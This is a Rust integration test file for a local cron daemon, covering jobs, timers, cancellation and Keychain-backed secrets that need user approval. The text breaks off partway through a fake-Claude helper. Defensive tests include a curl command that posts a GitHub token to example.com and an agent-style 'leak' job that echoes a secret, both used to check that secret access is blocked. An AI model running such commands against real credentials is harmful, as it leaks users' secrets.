//! The daemon as a program: started on a temporary folder, driven through
//! its socket, running real processes.

use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command};
use std::time::{Duration, Instant};

use serde_json::{Value, json};

struct Daemon {
    child: Child,
    home: tempfile::TempDir,
}

impl Daemon {
    fn start() -> Self {
        Self::start_in(tempfile::tempdir().unwrap())
    }

    fn start_in(home: tempfile::TempDir) -> Self {
        Self::start_with(home, false)
    }

    /// Every connection counts as the menu bar app, so a test can allow a
    /// job to read secrets.
    fn start_trusted() -> Self {
        Self::start_with(tempfile::tempdir().unwrap(), true)
    }

    fn start_with(home: tempfile::TempDir, trust_peers: bool) -> Self {
        Self::start_env(home, trust_peers, &[])
    }

    /// `extra` comes last, so it can replace LOCALCRON_PATH.
    fn start_env(home: tempfile::TempDir, trust_peers: bool, extra: &[(&str, String)]) -> Self {
        let child = Command::new(env!("CARGO_BIN_EXE_localcrond"))
            .env("LOCALCRON_TEST_TRUST_PEERS", if trust_peers { "1" } else { "0" })
            .env("LOCALCRON_HOME", home.path())
            // No ~/.local/bin with a real claude in it.
            .env("HOME", home.path())
            .env("LOCALCRON_PATH", "/usr/bin:/bin")
            .env("SHELL", "/bin/sh")
            // Never the login keychain.
            .env("LOCALCRON_TEST_KEYCHAIN", home.path().join("test.keychain"))
            .envs(extra.iter().map(|(k, v)| (*k, v)))
            .spawn()
            .unwrap();
        let d = Daemon { child, home };
        // Not only the file: bind() makes it before listen() accepts connections.
        wait_for(|| UnixStream::connect(d.socket()).is_ok(), "the socket");
        d
    }

    fn socket(&self) -> PathBuf {
        self.home.path().join("daemon.sock")
    }

    fn dir(&self) -> String {
        self.home.path().to_string_lossy().into_owned()
    }

    fn call(&self, method: &str, params: Value) -> Result<Value, Value> {
        let mut stream = UnixStream::connect(self.socket()).unwrap();
        let line = json!({"id": 1, "method": method, "params": params}).to_string() + "\n";
        stream.write_all(line.as_bytes()).unwrap();
        let mut reply = String::new();
        BufReader::new(stream).read_line(&mut reply).unwrap();
        let reply: Value = serde_json::from_str(&reply).unwrap();
        match reply.get("error") {
            Some(e) => Err(e.clone()),
            None => Ok(reply["result"].clone()),
        }
    }

    fn ok(&self, method: &str, params: Value) -> Value {
        self.call(method, params).unwrap_or_else(|e| panic!("{method}: {e}"))
    }

    fn shell_job(&self, id: &str, command: &str) -> Value {
        json!({"id": id, "schedule": "0 9 * * wed", "kind": "shell", "command": command, "dir": self.dir()})
    }

    fn run(&self, run_id: &str) -> Value {
        let runs = self.ok("list_runs", json!({}));
        runs["runs"].as_array().unwrap().iter().find(|r| r["id"] == run_id).cloned().unwrap()
    }

    fn wait_status(&self, run_id: &str, status: &str) -> Value {
        let mut last = Value::Null;
        wait_for(
            || {
                last = self.run(run_id);
                last["status"] == status
            },
            &format!("run {run_id} to be {status}"),
        );
        last
    }

    fn stop(mut self) -> tempfile::TempDir {
        unsafe { libc_kill(self.child.id() as i32, 15) };
        let _ = self.child.wait();
        std::mem::replace(&mut self.home, tempfile::tempdir().unwrap())
    }
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

unsafe extern "C" {
    #[link_name = "kill"]
    fn libc_kill(pid: i32, sig: i32) -> i32;
}

fn wait_for(mut done: impl FnMut() -> bool, what: &str) {
    let start = Instant::now();
    while !done() {
        assert!(start.elapsed() < Duration::from_secs(20), "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[test]
fn a_shell_job_runs_and_its_output_is_kept() {
    let d = Daemon::start();
    let added = d.ok("set_job", json!({"job": d.shell_job("hello", "echo hello from $LOCALCRON_JOB_ID; exit 3")}));
    assert_eq!(added["created"], true);
    assert_eq!(added["job"]["schedule_text"], "At 09:00 on Wednesday");
    assert!(added["job"]["next_run"].as_str().unwrap().contains("T09:00:00"));

    let run = d.ok("run_job", json!({"id": "hello"}))["run"].clone();
    assert_eq!(run["trigger"], "manual");
    let done = d.wait_status(run["id"].as_str().unwrap(), "failed");
    assert_eq!(done["exit_code"], 3);

    let log = d.ok("get_run_log", json!({"run_id": run["id"]}));
    assert!(log["text"].as_str().unwrap().contains("hello from hello"), "{log}");
    let job = d.ok("get_job", json!({"id": "hello"}))["job"].clone();
    assert_eq!(job["last_run"]["exit_code"], 3);
    assert!(job.get("active_run").is_none());
}

#[test]
fn an_existing_id_needs_replace() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": d.shell_job("a", "true")}));
    let e = d.call("set_job", json!({"job": d.shell_job("a", "false")})).unwrap_err();
    assert_eq!(e["code"], "exists");
    let replaced = d.ok("set_job", json!({"job": d.shell_job("a", "false"), "replace": true}));
    assert_eq!(replaced["created"], false);
    assert_eq!(replaced["job"]["command"], "false");

    let e = d.call("set_job", json!({"job": {"id": "b", "schedule": "0 9 * *", "kind": "shell", "command": "x", "dir": d.dir()}})).unwrap_err();
    assert_eq!(e["code"], "invalid");
    let e = d.call("set_job", json!({"job": d.shell_job("c", "true").as_object().unwrap().clone().into_iter().map(|(k, v)| if k == "dir" { (k, json!("/nope/nowhere")) } else { (k, v) }).collect::<serde_json::Map<_, _>>()})).unwrap_err();
    assert!(e["message"].as_str().unwrap().contains("not a folder"));
    assert_eq!(d.ok("remove_job", json!({"id": "a"}))["removed"], true);
    assert_eq!(d.ok("remove_job", json!({"id": "a"}))["removed"], false);
}

#[test]
fn runs_wait_for_a_free_slot_and_a_busy_job_is_skipped() {
    let d = Daemon::start();
    d.ok("set_config", json!({"max_concurrent": 1}));
    d.ok("set_job", json!({"job": d.shell_job("slow", "sleep 1")}));
    d.ok("set_job", json!({"job": d.shell_job("quick", "echo quick")}));

    let slow = d.ok("run_job", json!({"id": "slow"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&slow, "running");
    let again = d.ok("run_job", json!({"id": "slow"}))["run"].clone();
    assert_eq!(again["status"], "skipped");
    assert!(again["message"].as_str().unwrap().contains(&slow));

    let quick = d.ok("run_job", json!({"id": "quick"}))["run"]["id"].as_str().unwrap().to_string();
    assert_eq!(d.run(&quick)["status"], "queued");
    assert_eq!(d.ok("status", json!({}))["queued"], 1);
    d.wait_status(&slow, "succeeded");
    d.wait_status(&quick, "succeeded");
}

#[test]
fn cancel_stops_the_whole_process_group() {
    let d = Daemon::start();
    let marker = d.home.path().join("child-alive");
    // The shell starts a child; canceling must stop the child too.
    let command = format!("(sleep 3; touch {}) & wait", marker.display());
    d.ok("set_job", json!({"job": d.shell_job("long", &command)}));
    let run = d.ok("run_job", json!({"id": "long"}))["run"]["id"].as_str().unwrap().to_string();
    wait_for(|| d.run(&run)["pid"].is_number(), "the pid");
    let reply = d.ok("cancel_run", json!({"run_id": run}));
    assert_eq!(reply["canceled"], true);
    let done = d.wait_status(&run, "canceled");
    assert_eq!(done["message"], "canceled");
    std::thread::sleep(Duration::from_millis(3500));
    assert!(!marker.exists(), "the child kept running after cancel");
}

#[test]
fn force_kills_a_run_that_ignores_sigterm() {
    let d = Daemon::start();
    // An ignored signal stays ignored in the children, so sleep ignores it too.
    d.ok("set_job", json!({"job": d.shell_job("stubborn", "trap '' TERM; sleep 30")}));
    let run = d.ok("run_job", json!({"id": "stubborn"}))["run"]["id"].as_str().unwrap().to_string();
    wait_for(|| d.run(&run)["pid"].is_number(), "the pid");
    assert_eq!(d.ok("cancel_run", json!({"run_id": run}))["canceled"], true);
    std::thread::sleep(Duration::from_millis(500));
    assert_eq!(d.run(&run)["status"], "running", "SIGTERM is ignored, so the run waits for SIGKILL");

    let start = Instant::now();
    let reply = d.ok("cancel_run", json!({"run_id": run, "force": true}));
    assert_eq!(reply["canceled"], true);
    let done = d.wait_status(&run, "canceled");
    assert!(start.elapsed() < Duration::from_secs(5), "force waited for the grace time: {:?}", start.elapsed());
    assert_eq!(done["message"], "killed");
    assert_eq!(d.ok("cancel_run", json!({"run_id": run, "force": true}))["canceled"], false);
}

/// Two jobs due every minute, saved an hour ago: both are caught up at start.
fn write_missed_jobs(home: &Path, command: &str, config: Value) {
    let dir = home.to_string_lossy().into_owned();
    let updated = (chrono::Local::now() - chrono::Duration::hours(1)).fixed_offset().to_rfc3339();
    let job = |id: &str| json!({"id": id, "schedule": "* * * * *", "kind": "shell", "command": command, "dir": dir, "updated_at": updated});
    std::fs::write(home.join("jobs.json"), json!({"version": 1, "jobs": [job("a"), job("b")]}).to_string()).unwrap();
    std::fs::write(home.join("config.json"), config.to_string()).unwrap();
}

#[test]
fn a_paused_daemon_starts_no_scheduled_run_and_resume_does_not_catch_up() {
    let home = tempfile::tempdir().unwrap();
    write_missed_jobs(home.path(), "true", json!({"paused": true}));
    let d = Daemon::start_in(home);
    assert_eq!(d.ok("status", json!({}))["paused"], true);
    std::thread::sleep(Duration::from_millis(500));
    assert_eq!(d.ok("list_runs", json!({}))["runs"], json!([]), "a scheduled run started while paused");

    // A run someone asks for still starts.
    let manual = d.ok("run_job", json!({"id": "a"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&manual, "succeeded");

    let config = d.ok("set_config", json!({"paused": false}));
    assert_eq!(config["paused"], false);
    assert!(config["resumed_at"].is_string(), "{config}");
    assert_eq!(d.ok("status", json!({}))["paused"], false);
    std::thread::sleep(Duration::from_millis(500));
    let runs = d.ok("list_runs", json!({}))["runs"].as_array().unwrap().clone();
    assert!(runs.iter().all(|r| r["trigger"] != "catch_up"), "a time missed while paused was caught up: {runs:?}");

    // Not after a restart either.
    let d = Daemon::start_in(d.stop());
    std::thread::sleep(Duration::from_millis(500));
    let runs = d.ok("list_runs", json!({}))["runs"].as_array().unwrap().clone();
    assert!(runs.iter().all(|r| r["trigger"] != "catch_up"), "caught up after a restart: {runs:?}");
}

#[test]
fn pausing_cancels_queued_scheduled_runs_and_keeps_the_running_one() {
    let home = tempfile::tempdir().unwrap();
    write_missed_jobs(home.path(), "sleep 2", json!({"max_concurrent": 1}));
    let d = Daemon::start_in(home);
    wait_for(|| d.ok("status", json!({}))["queued"] == 1, "a queued catch-up run");
    let runs = d.ok("list_runs", json!({}))["runs"].as_array().unwrap().clone();
    let id_of = |status: &str| runs.iter().find(|r| r["status"] == status).unwrap()["id"].as_str().unwrap().to_string();
    let (running, queued) = (id_of("running"), id_of("queued"));

    assert_eq!(d.ok("set_config", json!({"paused": true}))["paused"], true);
    let canceled = d.run(&queued);
    assert_eq!(canceled["status"], "canceled");
    assert_eq!(canceled["message"], "LocalCron was paused");
    assert_eq!(d.run(&running)["status"], "running");
    d.wait_status(&running, "succeeded");
}

#[test]
fn a_run_past_its_timeout_is_stopped() {
    let d = Daemon::start();
    let mut job = d.shell_job("stuck", "sleep 30");
    job["timeout_secs"] = json!(1);
    d.ok("set_job", json!({"job": job}));
    let run = d.ok("run_job", json!({"id": "stuck"}))["run"]["id"].as_str().unwrap().to_string();
    let done = d.wait_status(&run, "timed_out");
    assert!(done["ended_at"].is_string());
}

#[test]
fn a_missing_program_fails_with_a_clear_message() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": {"id": "agent", "schedule": "@daily", "kind": "claude", "prompt": "hi", "dir": d.dir()}}));
    let run = d.ok("run_job", json!({"id": "agent"}))["run"]["id"].as_str().unwrap().to_string();
    let done = d.wait_status(&run, "failed");
    assert!(done["message"].as_str().unwrap().contains("claude was not found in PATH"), "{done}");
}

#[test]
fn a_time_missed_while_stopped_runs_once_at_start() {
    let home = tempfile::tempdir().unwrap();
    let dir = home.path().to_string_lossy().into_owned();
    // Saved an hour ago, due every minute: many times were missed.
    let updated = (chrono::Local::now() - chrono::Duration::hours(1)).fixed_offset().to_rfc3339();
    let jobs = json!({"version": 1, "jobs": [
        {"id": "every-minute", "schedule": "* * * * *", "kind": "shell", "command": "echo caught up", "dir": dir, "updated_at": updated},
        {"id": "no-catch-up", "schedule": "* * * * *", "kind": "shell", "command": "true", "dir": dir, "updated_at": updated, "catch_up": false},
    ]});
    std::fs::write(home.path().join("jobs.json"), jobs.to_string()).unwrap();
    let d = Daemon::start_in(home);
    wait_for(|| d.ok("list_runs", json!({"job_id": "every-minute"}))["runs"].as_array().unwrap().len() == 1, "the catch-up run");
    let runs = d.ok("list_runs", json!({"job_id": "every-minute"}));
    let run = &runs["runs"][0];
    assert_eq!(run["trigger"], "catch_up");
    d.wait_status(run["id"].as_str().unwrap(), "succeeded");
    // Exactly one run, not one per missed minute.
    std::thread::sleep(Duration::from_millis(300));
    let all = d.ok("list_runs", json!({}))["runs"].as_array().unwrap().clone();
    assert!(all.iter().filter(|r| r["job_id"] == "every-minute").count() <= 2, "{all:?}");
    assert!(all.iter().all(|r| r["job_id"] != "no-catch-up" || r["trigger"] != "catch_up"));
}

#[test]
fn jobs_and_runs_survive_a_restart() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": d.shell_job("keep", "echo kept")}));
    let run = d.ok("run_job", json!({"id": "keep"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&run, "succeeded");
    d.ok("set_job_enabled", json!({"id": "keep", "enabled": false}));
    let home = d.stop();
    assert!(!Path::new(&home.path().join("daemon.sock")).exists());

    let d = Daemon::start_in(home);
    let job = d.ok("get_job", json!({"id": "keep"}))["job"].clone();
    assert_eq!(job["enabled"], false);
    assert!(job.get("next_run").is_none());
    assert_eq!(job["last_run"]["id"], run.as_str());
}

#[test]
fn only_the_newest_runs_are_kept() {
    let d = Daemon::start();
    d.ok("set_config", json!({"keep_runs": 2}));
    d.ok("set_job", json!({"job": d.shell_job("many", "true")}));
    let mut ids = vec![];
    for _ in 0..4 {
        let id = d.ok("run_job", json!({"id": "many"}))["run"]["id"].as_str().unwrap().to_string();
        d.wait_status(&id, "succeeded");
        ids.push(id);
    }
    let runs = d.ok("list_runs", json!({"job_id": "many"}))["runs"].clone();
    let kept: Vec<&str> = runs.as_array().unwrap().iter().map(|r| r["id"].as_str().unwrap()).collect();
    assert_eq!(kept, [ids[3].as_str(), ids[2].as_str()]);
    let logs = std::fs::read_dir(d.home.path().join("logs/runs/many")).unwrap().count();
    assert_eq!(logs, 2);
}

#[test]
fn preview_and_errors() {
    let d = Daemon::start();
    let p = d.ok("preview_schedule", json!({"schedule": "0 9 * * wed", "count": 3}));
    assert_eq!(p["description"], "At 09:00 on Wednesday");
    assert_eq!(p["next"].as_array().unwrap().len(), 3);
    assert_eq!(d.call("preview_schedule", json!({"schedule": "nope"})).unwrap_err()["code"], "invalid");
    assert_eq!(d.call("get_job", json!({"id": "x"})).unwrap_err()["code"], "not_found");
    assert_eq!(d.call("explode", json!({})).unwrap_err()["code"], "unknown_method");
    assert_eq!(d.call("hello", json!({"client": "t", "api_version": "9.0"})).unwrap_err()["code"], "version_mismatch");
    assert_eq!(d.call("set_config", json!({"max_concurrent": 0})).unwrap_err()["code"], "invalid");
}

fn timer(d: &Daemon, id: &str, after: &str, command: &str) -> Value {
    json!({"id": id, "schedule": format!("@in {after}"), "kind": "shell", "command": command, "dir": d.dir()})
}

fn job_exists(d: &Daemon, id: &str) -> bool {
    d.call("get_job", json!({"id": id})).is_ok()
}

#[test]
fn a_timer_runs_once_then_its_job_is_removed_and_its_run_is_kept() {
    let d = Daemon::start();
    let added = d.ok("set_job", json!({"job": timer(&d, "tea", "2s", "echo tea is ready")}))["job"].clone();
    assert!(added["schedule"].as_str().unwrap().starts_with("@at "), "{added}");
    assert!(added["schedule_text"].as_str().unwrap().starts_with("Once, on"), "{added}");
    assert!(added["next_run"].is_string(), "{added}");

    wait_for(|| !job_exists(&d, "tea"), "the timer's job to be removed");
    let runs = d.ok("list_runs", json!({"job_id": "tea"}))["runs"].clone();
    let runs = runs.as_array().unwrap();
    assert_eq!(runs.len(), 1, "{runs:?}");
    assert_eq!(runs[0]["trigger"], "schedule");
    assert_eq!(runs[0]["status"], "succeeded");
    let log = d.ok("get_run_log", json!({"run_id": runs[0]["id"]}));
    assert!(log["text"].as_str().unwrap().contains("tea is ready"), "{log}");

    // The removal is saved: the job does not come back after a restart.
    let d = Daemon::start_in(d.stop());
    assert!(!job_exists(&d, "tea"));
    assert_eq!(d.ok("list_runs", json!({"job_id": "tea"}))["runs"].as_array().unwrap().len(), 1);
}

#[test]
fn a_manual_run_of_a_timer_keeps_the_job() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": timer(&d, "later", "1h", "true")}));
    let run = d.ok("run_job", json!({"id": "later"}))["run"].clone();
    d.wait_status(run["id"].as_str().unwrap(), "succeeded");
    let job = d.ok("get_job", json!({"id": "later"}))["job"].clone();
    assert_eq!(job["enabled"], true);
    assert!(job["next_run"].is_string(), "{job}");
}

#[test]
fn an_early_run_takes_the_place_of_the_next_scheduled_run() {
    let d = Daemon::start();
    let next = d.ok("set_job", json!({"job": d.shell_job("weekly", "echo early")}))["job"]["next_run"].clone();
    let run = d.ok("run_job", json!({"id": "weekly", "early": true}))["run"].clone();
    assert_eq!(run["trigger"], "early");
    assert_eq!(run["due_at"], next, "{run}");
    d.wait_status(run["id"].as_str().unwrap(), "succeeded");
    let job = d.ok("get_job", json!({"id": "weekly"}))["job"].clone();
    let after = job["next_run"].as_str().unwrap();
    assert!(after > next.as_str().unwrap(), "next_run {after} is not after {next}");

    // Nor when the job is turned off and on, or LocalCron is paused and resumed.
    d.ok("set_job_enabled", json!({"id": "weekly", "enabled": false}));
    assert_eq!(d.ok("set_job_enabled", json!({"id": "weekly", "enabled": true}))["job"]["next_run"], after);
    d.ok("set_config", json!({"paused": true}));
    d.ok("set_config", json!({"paused": false}));
    assert_eq!(d.ok("get_job", json!({"id": "weekly"}))["job"]["next_run"], after);

    // The time it took does not come back after a restart.
    let d = Daemon::start_in(d.stop());
    assert_eq!(d.ok("get_job", json!({"id": "weekly"}))["job"]["next_run"], after);
}

#[test]
fn an_early_run_of_a_busy_job_is_skipped_and_keeps_the_next_run() {
    let d = Daemon::start();
    let next = d.ok("set_job", json!({"job": d.shell_job("busy", "sleep 30")}))["job"]["next_run"].clone();
    let first = d.ok("run_job", json!({"id": "busy"}))["run"]["id"].as_str().unwrap().to_string();
    let early = d.ok("run_job", json!({"id": "busy", "early": true}))["run"].clone();
    assert_eq!(early["status"], "skipped");
    assert!(early.get("due_at").is_none(), "{early}");
    assert_eq!(d.ok("get_job", json!({"id": "busy"}))["job"]["next_run"], next);
    d.ok("cancel_run", json!({"run_id": first, "force": true}));
}

#[test]
fn an_early_run_needs_a_next_run() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": d.shell_job("off", "true")}));
    d.ok("set_job_enabled", json!({"id": "off", "enabled": false}));
    let e = d.call("run_job", json!({"id": "off", "early": true})).unwrap_err();
    assert_eq!(e["code"], "invalid", "{e}");
    assert_eq!(d.ok("list_runs", json!({"job_id": "off"}))["runs"].as_array().unwrap().len(), 0);
}

#[test]
fn an_early_run_of_a_timer_is_its_one_run() {
    let d = Daemon::start();
    d.ok("set_job", json!({"job": timer(&d, "soon", "1h", "true")}));
    let run = d.ok("run_job", json!({"id": "soon", "early": true}))["run"].clone();
    d.wait_status(run["id"].as_str().unwrap(), "succeeded");
    wait_for(|| !job_exists(&d, "soon"), "the timer's job to be removed");
}

#[test]
fn runs_of_removed_timers_are_kept_up_to_keep_runs() {
    let d = Daemon::start();
    d.ok("set_config", json!({"keep_runs": 2, "max_concurrent": 3}));
    for id in ["t1", "t2", "t3"] {
        d.ok("set_job", json!({"job": timer(&d, id, "1s", "true")}));
    }
    wait_for(|| ["t1", "t2", "t3"].iter().all(|id| !job_exists(&d, id)), "the timers' jobs to be removed");
    let runs = d.ok("list_runs", json!({}))["runs"].clone();
    assert_eq!(runs.as_array().unwrap().len(), 2, "{runs}");
    let log_dirs = std::fs::read_dir(d.home.path().join("logs/runs")).unwrap().count();
    assert_eq!(log_dirs, 2);
}

#[test]
fn a_timer_preview_is_one_time_from_now() {
    let d = Daemon::start();
    let p = d.ok("preview_schedule", json!({"schedule": "@in 20m", "count": 3}));
    assert!(p["description"].as_str().unwrap().starts_with("Once, on"), "{p}");
    assert_eq!(p["next"].as_array().unwrap().len(), 1);
    let e = d.call("preview_schedule", json!({"schedule": "@in soon"})).unwrap_err();
    assert!(e["message"].as_str().unwrap().contains("@in 20m"), "{e}");
}

#[test]
fn a_job_gets_its_secret_and_no_reply_or_file_has_the_value() {
    use std::os::unix::fs::PermissionsExt;
    let d = Daemon::start_trusted();
    // The log header shows the command, so it must not spell the value.
    let mut job = d.shell_job("deploy", r#"test "ghp_${GH_TOKEN#ghp_}" = "$GH_TOKEN" && test "${GH_TOKEN#ghp_}" = value1 && echo token-ok"#);
    job["secret_env"] = json!({"GH_TOKEN": "github-token"});

    // Saved, but the reply says what is missing and how to set it.
    let added = d.ok("set_job", json!({"job": job}));
    assert_eq!(
        added["missing_secrets"],
        json!([{"name": "github-token", "env": "GH_TOKEN", "set_command": "localcron secret set github-token"}])
    );
    d.ok("allow_job_secrets", json!({"job": added["job"]}));
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    let failed = d.wait_status(&run, "failed");
    assert_eq!(failed["message"], "secret github-token is not set: run localcron secret set github-token in a terminal");

    let set = d.ok(
        "set_secret",
        json!({"name": "github-token", "value": "ghp_value1", "description": "GitHub fine-grained token, repo shop, github.com/settings/tokens"}),
    );
    assert_eq!(set["created"], true);
    assert_eq!(set["secret"]["state"], "ok");
    assert_eq!(set["secret"]["used_by"], json!(["deploy"]));
    assert_eq!(set["secret"]["set_command"], "localcron secret set github-token");
    assert!(!set.to_string().contains("ghp_value1"), "{set}");

    let replaced = d.ok("set_job", json!({"job": job, "replace": true}));
    assert!(replaced.get("missing_secrets").is_none(), "{replaced}");
    // The same job saved again: what it runs did not change.
    assert_eq!(replaced["job"]["secrets_allowed"], true);
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&run, "succeeded");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("token-ok") && log.contains("# secrets: GH_TOKEN from github-token"), "{log}");
    assert!(!log.contains("ghp_value1"), "{log}");

    // A new value; the description stays.
    d.ok("set_secret", json!({"name": "github-token", "value": "ghp_value2"}));
    let list = d.ok("list_secrets", json!({}));
    assert_eq!(list["secrets"][0]["description"], "GitHub fine-grained token, repo shop, github.com/settings/tokens");
    assert!(!list.to_string().contains("ghp_value"), "{list}");
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    d.wait_status(&run, "failed");

    // Only the description; the time of the value stays.
    let before = list["secrets"][0]["updated_at"].clone();
    let described = d.ok("set_secret", json!({"name": "github-token", "description": "expires 2027-01-31"}));
    assert_eq!(described["secret"]["description"], "expires 2027-01-31");
    assert_eq!(described["secret"]["updated_at"], before);
    assert_eq!(d.call("set_secret", json!({"name": "nope", "description": "x"})).unwrap_err()["code"], "not_found");

    for file in ["jobs.json", "runs.json", "secrets.json"] {
        let path = d.home.path().join(file);
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(!text.contains("ghp_value"), "{file}: {text}");
        assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600, "{file}");
    }

    let removed = d.ok("remove_secret", json!({"name": "github-token"}));
    assert_eq!(removed, json!({"removed": true, "used_by": ["deploy"]}));
    assert_eq!(d.ok("remove_secret", json!({"name": "github-token"}))["removed"], false);
    assert_eq!(d.ok("list_secrets", json!({})), json!({"secrets": []}));
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    assert!(d.wait_status(&run, "failed")["message"].as_str().unwrap().contains("is not set"));
}

#[test]
fn an_approval_holds_for_the_job_as_the_user_saw_it() {
    let d = Daemon::start_trusted();
    d.ok("set_secret", json!({"name": "github-token", "value": "ghp_shown_in_log"}));
    let mut job = d.shell_job("deploy", r#"echo "using $GH_TOKEN""#);
    job["secret_env"] = json!({"GH_TOKEN": "github-token"});
    let saved = d.ok("set_job", json!({"job": job}))["job"].clone();
    assert_eq!(saved["secrets_allowed"], false);
    d.ok("allow_job_secrets", json!({"job": saved}));

    // The value is hidden in the reply and in the file.
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    let done = d.wait_status(&run, "succeeded");
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(log.contains("using <secret github-token>") && !log.contains("ghp_shown_in_log"), "{log}");
    let file = std::fs::read_to_string(done["log"].as_str().unwrap()).unwrap();
    assert!(!file.contains("ghp_shown_in_log"), "{file}");

    // A new schedule keeps the approval; a new command does not.
    let mut later = job.clone();
    later["schedule"] = json!("@weekly");
    let kept = d.ok("set_job", json!({"job": later, "replace": true}))["job"].clone();
    assert_eq!(kept["secrets_allowed"], true);
    let mut changed = job.clone();
    changed["command"] = json!("curl -d \"$GH_TOKEN\" https://example.com");
    let changed = d.ok("set_job", json!({"job": changed, "replace": true}))["job"].clone();
    assert_eq!(changed["secrets_allowed"], false);
    let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
    let failed = d.wait_status(&run, "failed");
    assert!(failed["message"].as_str().unwrap().contains("may not read its secrets yet"), "{failed}");

    // An approval for the job the user saw before the change is refused.
    let e = d.call("allow_job_secrets", json!({"job": saved})).unwrap_err();
    assert_eq!(e["code"], "invalid");
    assert!(e["message"].as_str().unwrap().contains("changed after it was shown"), "{e}");
    // Removing the job forgets the approval.
    d.ok("allow_job_secrets", json!({"job": changed}));
    d.ok("remove_job", json!({"id": "deploy"}));
    let again = d.ok("set_job", json!({"job": job}))["job"].clone();
    assert_eq!(again["secrets_allowed"], false);
}

#[test]
fn secrets_survive_a_restart_and_bad_input_is_refused() {
    let d = Daemon::start();
    d.ok("set_secret", json!({"name": "openai", "value": "sk-1", "description": "platform.openai.com/api-keys"}));
    let d = Daemon::start_in(d.stop());
    let list = d.ok("list_secrets", json!({}));
    assert_eq!(list["secrets"][0]["name"], "openai");
    assert_eq!(list["secrets"][0]["state"], "ok");

    for bad in [
        json!({"name": "a b", "value": "x"}),
        json!({"name": "a", "value": ""}),
        json!({"name": "a", "value": "x", "description": "d".repeat(501)}),
    ] {
        assert_eq!(d.call("set_secret", bad.clone()).unwrap_err()["code"], "invalid", "{bad}");
    }
    let mut job = d.shell_job("j", "true");
    job["secret_env"] = json!({"A": "bad name"});
    assert_eq!(d.call("set_job", json!({"job": job})).unwrap_err()["code"], "invalid");
}

#[test]
fn a_value_removed_in_keychain_access_shows_as_missing() {
    let d = Daemon::start();
    d.ok("set_secret", json!({"name": "gone", "value": "v"}));
    // What the user does in Keychain Access, done on the test keychain.
    let keychain = d.home.path().join("test.keychain");
    let status = Command::new("security")
        .args(["delete-generic-password", "-s", "dev.localcron.app.secrets", "-a", "gone"])
        .arg(&keychain)
        .stdout(std::process::Stdio::null())
        .status()
        .unwrap();
    assert!(status.success());
    let list = d.ok("list_secrets", json!({}));
    assert_eq!(list["secrets"][0]["state"], "missing");
    assert_eq!(list["secrets"][0]["message"], "no value in the Keychain");
}

/// What an agent (or any program running as the user) could do: write a job
/// that prints a secret, run it, read the log.
#[test]
fn a_job_nobody_allowed_cannot_read_a_secret() {
    let d = Daemon::start();
    d.ok("set_secret", json!({"name": "github-token", "value": "ghp_stolen1"}));
    let mut job = d.shell_job("leak", r#"echo "token is $GH_TOKEN""#);
    job["secret_env"] = json!({"GH_TOKEN": "github-token"});
    d.ok("set_job", json!({"job": job}));
    let run = d.ok("run_job", json!({"id": "leak"}))["run"]["id"].as_str().unwrap().to_string();
    let done = loop {
        let r = d.run(&run);
        if r["status"] != "queued" && r["status"] != "running" {
            break r;
        }
        std::thread::sleep(Duration::from_millis(50));
    };
    let log = d.ok("get_run_log", json!({"run_id": run}))["text"].as_str().unwrap().to_string();
    assert!(!log.contains("ghp_stolen1"), "the job read the secret: {log}");
    assert_eq!(done["status"], "failed", "{done}");
    assert!(done["message"].as_str().unwrap().contains("may not read its secrets yet"), "{done}");

    // Only the menu bar app may allow it; this connection is not the app.
    let shown = d.ok("get_job", json!({"id": "leak"}))["job"].clone();
    let e = d.call("allow_job_secrets", json!({"job": shown})).unwrap_err();
    assert_eq!(e["code"], "not_allowed", "{e}");
}

/// A stand-in for Claude Code: `-p` prints and ends; the console form plays
/// what $FAKE_CLAUDE says and then waits, as an interactive session does.
const FAKE_CLAUDE: &str = r#"#!/bin/sh
if [ "$1" = "-p" ]; then echo "run without a console"; exit 0; fi
case "$FAKE_CLAUDE" in
  dialog) echo "Do you trust the files in this folder?" ;;
  long) printf 'prompt\n' >> "$LOCALCRON_EVENTS"; echo "fake claude busy"; touch fake-started ;;
  *) printf 'prompt\n' >> "$LOCALCRON_EVENTS"; echo "fake claude working"; echo "args: $*"; printf 'stop\n' >> "$LOCALCRON_EVENTS" ;;
esac
sleep 60
"#;

/// A daemon whose PATH has the fake claude and the real tmux; None without
/// tmux. `grace_ms`: how long claude may take to start in the console.
fn console_daemon(grace_ms: u64) -> Option<Daemon> {
    let tmux = ["/opt/homebrew/bin/tmux", "/usr/local/bin/tmux"].into_iter().find(|p| Path::new(p).exists())?;
    let home = tempfile::Builder::new().prefix("lc").tempdir_in("/tmp").unwrap();
    let bin = home.path().join("bin");
    std::fs::create_dir(&bin).unwrap();
    std::fs::write(bin.join("claude"), FAKE_CLAUDE).unwrap();
    std::os::unix::fs::symlink(tmux, bin.join("tmux")).unwrap();
    std::process::Command::new("chmod").arg("+x").arg(bin.join("claude")).status().unwrap();
    let path = format!("{}:/usr/bin:/bin", bin.display());
